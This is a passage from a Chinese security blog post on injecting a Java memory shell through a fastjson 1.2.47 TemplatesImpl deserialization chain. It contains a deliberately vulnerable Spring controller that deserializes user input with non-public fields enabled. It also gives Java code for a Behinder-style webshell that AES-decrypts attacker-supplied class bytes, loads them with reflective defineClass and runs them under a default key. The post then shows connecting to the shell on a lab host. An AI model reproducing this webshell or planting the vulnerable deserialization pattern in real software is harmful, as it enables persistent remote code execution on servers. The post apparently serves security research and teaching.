<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">package com.shiro.vuln.Controller;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import org.springframework.http.MediaType;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line">import org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">public class FastjsonController &#123;</span><br><span class="line">    @RequestMapping( &quot;/deserialize&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public String deserialize(@RequestParam String code) throws Exception&#123;</span><br><span class="line">//        JSON.parse(code);</span><br><span class="line">        //fastjson1.2.47 TemplatesImpl利用</span><br><span class="line">        JSON.parseObject(code,Object.class, Feature.SupportNonPublicField);</span><br><span class="line">        return &quot;deserialize&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675059852710-c8a90084-4406-42d6-8702-ef3ac4c5aa7c.png#averageHue=%23a67c0c&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=693&id=ufc033a4c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1386&originWidth=2284&originalType=binary&ratio=1&rotation=0&showTitle=false&size=259524&status=done&style=none&taskId=u4f71bc9a-6d38-46f2-9e6a-6ac5a39a8ae&title=&width=1142" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675059982883-01e39f03-7360-4309-9a30-3e90219d352a.png#averageHue=%23f8f8f8&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=664&id=u140854c1&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1328&originWidth=2010&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181386&status=done&style=none&taskId=u3e9d7968-fef8-444e-a218-3facd43e12e&title=&width=1005" alt="image.png"><br>2、使用TemplatesImplEvil字节码攻击<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675060025506-f642dd0c-b47a-4723-9044-d2477de8dc7f.png#averageHue=%232d2c2c&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=444&id=u7ab0dfdb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=888&originWidth=2214&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151757&status=done&style=none&taskId=u1fb5e6eb-bb0c-456e-91f5-0c3eea73bc4&title=&width=1107" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675060137783-2f57fddc-0c2f-4753-9627-77c709cf2715.png#averageHue=%23333232&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=718&id=u96d6351b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1436&originWidth=2308&originalType=binary&ratio=1&rotation=0&showTitle=false&size=345565&status=done&style=none&taskId=uba17e1b7-ab95-49c2-b9d3-f4cccd672de&title=&width=1154" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675060226262-b081ad9d-15f7-4a04-9131-74bc3075c90f.png#averageHue=%23ccbea7&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=680&id=u151b0a08&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1360&originWidth=2014&originalType=binary&ratio=1&rotation=0&showTitle=false&size=960807&status=done&style=none&taskId=u87bf76d3-aefb-40cf-bb6e-fcf7790b000&title=&width=1007" alt="image.png"><br>3、获取内存马字节码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675060326585-a94ec00a-2985-42e0-b081-0a0a3b31d0e1.png#averageHue=%23323232&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=736&id=u33cdeb73&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1472&originWidth=2306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=339128&status=done&style=none&taskId=u4c9dfe2d-6d61-4521-bd78-0c8049c5d56&title=&width=1153" alt="image.png"><br>4、攻击fastjson，注入内存马<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675060379970-837f657b-5b63-4d3f-b5bf-a83602add62a.png#averageHue=%23e6e6e4&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=675&id=u4a6d1fa4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1350&originWidth=2010&originalType=binary&ratio=1&rotation=0&showTitle=false&size=789300&status=done&style=none&taskId=u475ed214-8cbf-42b1-bc4b-5f6c1bfb700&title=&width=1005" alt="image.png"><br>5、访问内存马<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675060414164-5325a5b7-0e42-4547-b5c8-68ffdb9be86a.png#averageHue=%23fbfcfa&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=420&id=uef9eeab8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=840&originWidth=1598&originalType=binary&ratio=1&rotation=0&showTitle=false&size=132132&status=done&style=none&taskId=u2a305a96-5fad-4f79-92f9-613b35faffa&title=&width=799" alt="image.png"><br>6、修改test部分为冰蝎逻辑即可注入冰蝎内存马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">public void test() throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">            HttpSession session = request.getSession();</span><br><span class="line">            //create pageContext</span><br><span class="line">            HashMap pageContext = new HashMap();</span><br><span class="line">            pageContext.put(&quot;request&quot;, request);</span><br><span class="line">            pageContext.put(&quot;response&quot;, response);</span><br><span class="line">            pageContext.put(&quot;session&quot;, session);</span><br><span class="line"></span><br><span class="line">            if (request.getMethod().equals(&quot;POST&quot;))&#123;</span><br><span class="line">                String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span><br><span class="line">                session.putValue(&quot;u&quot;,k);</span><br><span class="line">                Cipher c=Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">                c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));</span><br><span class="line">                Method method = Class.forName(&quot;java.lang.ClassLoader&quot;).getDeclaredMethod(&quot;defineClass&quot;, byte[].class, int.class, int.class);</span><br><span class="line">                method.setAccessible(true);</span><br><span class="line">                byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));</span><br><span class="line">                Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length);</span><br><span class="line">                evilclass.newInstance().equals(pageContext);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>生成base64字节码<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675061167043-9e7c9301-1eea-412c-98de-17c92f46bbba.png#averageHue=%230d4683&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=757&id=u3b701497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1514&originWidth=2260&originalType=binary&ratio=1&rotation=0&showTitle=false&size=366977&status=done&style=none&taskId=uc15116bb-3f63-4b0f-a72b-182b17fc7b6&title=&width=1130" alt="image.png"><br>执行json解析<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675061142870-4a846aac-d631-49e2-9db4-5b811ce6e577.png#averageHue=%23eae9e7&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=662&id=u64475b2c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1324&originWidth=2010&originalType=binary&ratio=1&rotation=0&showTitle=false&size=695815&status=done&style=none&taskId=u44ec793f-85a1-4401-bdcb-78d9759be59&title=&width=1005" alt="image.png"><br>连接<a target="_blank" rel="noopener" href="http://192.168.100.71:8080/shell">http://192.168.100.71:8080/shell</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675062215400-9bb1061e-03a1-4e69-a20a-d562164cb218.png#averageHue=%23212121&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=828&id=u67dfb675&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1656&originWidth=2600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=132074&status=done&style=none&taskId=u88d12a36-e8ac-4b31-baff-c32850025c0&title=&width=1300" alt="image.png"></p>
<h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12042">https://xz.aliyun.com/t/12042</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/30F7FomHiTnak_qe8mslIQ">https://mp.weixin.qq.com/s/30F7FomHiTnak_qe8mslIQ</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10781#toc-5">https://xz.aliyun.com/t/10781</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12047">https://xz.aliyun.com/t/12047</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">jasson</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://j-jasson2.github.io/2023/01/31/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC/">https://j-jasson2.github.io/2023/01/31/TemplatesImpl利用链与内存马/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://j-jasson2.github.io" target="_blank">jasson个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a><a class="post-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div><div class="post_share"><div class="social-share" data-image="https://img2022.cnblogs.com/blog/2804790/202204/2804790-20220413032653997-1992249252.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/12/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%88%B0shiro%E6%B3%A8%E5%85%A5WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/"><img class="next-cover" src="https://img0.baidu.com/it/u=3845303080,3279446310&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">反序列化分析到shiro注入WebSocket内存马</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/12/19/实战xray+burp挖掘通用型漏洞/" title="实战xray+burp挖掘通用型漏洞"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.liuyixiang.com%2Fimage%2F2020%2F3%2FaIF7Rf.png&refer=http%3A%2F%2Fimg.liuyixiang.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643955214&t=0c2ff5a70a4350f15f24b54ead8e3009" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-19</div><div class="title">实战xray+burp挖掘通用型漏洞</div></div></a></div><div><a href="/2021/11/02/ClassCMS1.3任意文件上传漏洞分析/" title="ClassCMS1.3任意文件上传漏洞分析"><img class="cover" src="/img/12.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-02</div><div class="title">ClassCMS1.3任意文件上传漏洞分析</div></div></a></div><div><a href="/2021/08/03/某cms代码审计RCE&艰难bypass(思路清奇)/" title="某cms代码审计RCE&艰难bypass(思路清奇)"><img class="cover" src="https://img0.baidu.com/it/u=751296986,1439230770&fm=253&fmt=auto&app=120&f=JPEG?w=650&h=407" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-03</div><div class="title">某cms代码审计RCE&艰难bypass(思路清奇)</div></div></a></div><div><a href="/2021/10/29/梦想CMS注入漏洞分析&发现小彩蛋/" title="梦想CMS注入漏洞分析&发现小彩蛋"><img class="cover" src="/images/sql.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-29</div><div class="title">梦想CMS注入漏洞分析&发现小彩蛋</div></div></a></div><div><a href="/2021/12/28/记一次泛微漏洞分析到发现未公开新漏洞/" title="记一次泛微漏洞分析到发现未公开新漏洞"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fdoc.100lw.com%2Fpic%2Fea0032eba51d8d4d08ed20da058ca49296b40f8a%2F1-810-jpg_6-1170-0-0-1170.jpg&refer=http%3A%2F%2Fdoc.100lw.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1643955180&t=0d529ef70f03d4f98808ca095f2ea725" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-28</div><div class="title">记一次泛微漏洞分析到发现未公开新漏洞</div></div></a></div><div><a href="/2021/12/30/漏洞分析｜某OA历史漏洞复现分析/" title="漏洞分析｜某OA历史漏洞复现分析"><img class="cover" src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2020.cnblogs.com%2Fblog%2F1827892%2F202004%2F1827892-20200406173605663-468610130.png&refer=http%3A%2F%2Fimg2020.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1644054500&t=67d36ee9895f6e0842b997b7940005b6" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-30</div><div class="title">漏洞分析｜某OA历史漏洞复现分析</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">jasson</div><div class="author-info__description">专注于Web、内网渗透、红蓝攻防、代码审计，分享知识，分享生活。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">41</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">79</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/j-jasson2"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">0x01 背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">0x02 类加载器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-defineClass%E5%8A%A0%E8%BD%BD%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">0x03 defineClass加载器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-newInstance%E4%B8%8Enew"><span class="toc-number">4.</span> <span class="toc-text">0x04 newInstance与new</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8TemplatesImpl%E6%9D%A5%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">0x05 利用TemplatesImpl来加载字节码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">6.</span> <span class="toc-text">0x06 内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-fastjson1-2-47%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">7.</span> <span class="toc-text">0x07 fastjson1.2.47注入内存马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/01/31/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC/" title="TemplatesImpl利用链与内存马"><img src="https://img2022.cnblogs.com/blog/2804790/202204/2804790-20220413032653997-1992249252.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TemplatesImpl利用链与内存马"/></a><div class="content"><a class="title" href="/2023/01/31/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC/" title="TemplatesImpl利用链与内存马">TemplatesImpl利用链与内存马</a><time datetime="2023-01-31T12:45:41.000Z" title="发表于 2023-01-31 20:45:41">2023-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/12/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%88%B0shiro%E6%B3%A8%E5%85%A5WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/" title="反序列化分析到shiro注入WebSocket内存马"><img src="https://img0.baidu.com/it/u=3845303080,3279446310&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反序列化分析到shiro注入WebSocket内存马"/></a><div class="content"><a class="title" href="/2022/12/21/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%88%B0shiro%E6%B3%A8%E5%85%A5WebSocket%E5%86%85%E5%AD%98%E9%A9%AC/" title="反序列化分析到shiro注入WebSocket内存马">反序列化分析到shiro注入WebSocket内存马</a><time datetime="2022-12-21T12:21:33.000Z" title="发表于 2022-12-21 20:21:33">2022-12-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BD%9C%E6%9F%90OA%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="漏洞分析｜某OA历史漏洞复现分析"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg2020.cnblogs.com%2Fblog%2F1827892%2F202004%2F1827892-20200406173605663-468610130.png&amp;refer=http%3A%2F%2Fimg2020.cnblogs.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1644054500&amp;t=67d36ee9895f6e0842b997b7940005b6" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="漏洞分析｜某OA历史漏洞复现分析"/></a><div class="content"><a class="title" href="/2021/12/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BD%9C%E6%9F%90OA%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/" title="漏洞分析｜某OA历史漏洞复现分析">漏洞分析｜某OA历史漏洞复现分析</a><time datetime="2021-12-30T02:45:41.000Z" title="发表于 2021-12-30 10:45:41">2021-12-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B3%9B%E5%BE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%B0%E5%8F%91%E7%8E%B0%E6%9C%AA%E5%85%AC%E5%BC%80%E6%96%B0%E6%BC%8F%E6%B4%9E/" title="记一次泛微漏洞分析到发现未公开新漏洞"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fdoc.100lw.com%2Fpic%2Fea0032eba51d8d4d08ed20da058ca49296b40f8a%2F1-810-jpg_6-1170-0-0-1170.jpg&amp;refer=http%3A%2F%2Fdoc.100lw.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1643955180&amp;t=0d529ef70f03d4f98808ca095f2ea725" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次泛微漏洞分析到发现未公开新漏洞"/></a><div class="content"><a class="title" href="/2021/12/28/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%B3%9B%E5%BE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%B0%E5%8F%91%E7%8E%B0%E6%9C%AA%E5%85%AC%E5%BC%80%E6%96%B0%E6%BC%8F%E6%B4%9E/" title="记一次泛微漏洞分析到发现未公开新漏洞">记一次泛微漏洞分析到发现未公开新漏洞</a><time datetime="2021-12-28T02:45:41.000Z" title="发表于 2021-12-28 10:45:41">2021-12-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/19/%E5%AE%9E%E6%88%98xray+burp%E6%8C%96%E6%8E%98%E9%80%9A%E7%94%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E/" title="实战xray+burp挖掘通用型漏洞"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.liuyixiang.com%2Fimage%2F2020%2F3%2FaIF7Rf.png&amp;refer=http%3A%2F%2Fimg.liuyixiang.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1643955214&amp;t=0c2ff5a70a4350f15f24b54ead8e3009" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="实战xray+burp挖掘通用型漏洞"/></a><div class="content"><a class="title" href="/2021/12/19/%E5%AE%9E%E6%88%98xray+burp%E6%8C%96%E6%8E%98%E9%80%9A%E7%94%A8%E5%9E%8B%E6%BC%8F%E6%B4%9E/" title="实战xray+burp挖掘通用型漏洞">实战xray+burp挖掘通用型漏洞</a><time datetime="2021-12-19T02:45:41.000Z" title="发表于 2021-12-19 10:45:41">2021-12-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023  <i id="heartbeat" class="fa fas fa-heartbeat"></i> jasson</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><p><a style="margin-inline:5px"target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为 Hexo" alt="HEXO"></a><a style="margin-inline:5px"target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用 Butterfly" alt="Butterfly"></a><a style="margin-inline:5px"target="_blank" href="https://www.jsdelivr.com/"><img src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用 Jsdelivr 为静态资源提供CDN加速" alt="Jsdelivr"></a><a style="margin-inline:5px"target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由 GitHub 托管" alt="GitHub"></a><a style="margin-inline:5px"target="_blank"href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" alt="img" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'ezr37wKgCkQA0GoJHntOvgbB-MdYXbMMI',
      appKey: '7waFMOWmYb026lMWzexxu7RF',
      placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script defer src="/live2d-widget/autoload.js"></script><script defer src="/js/phone.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
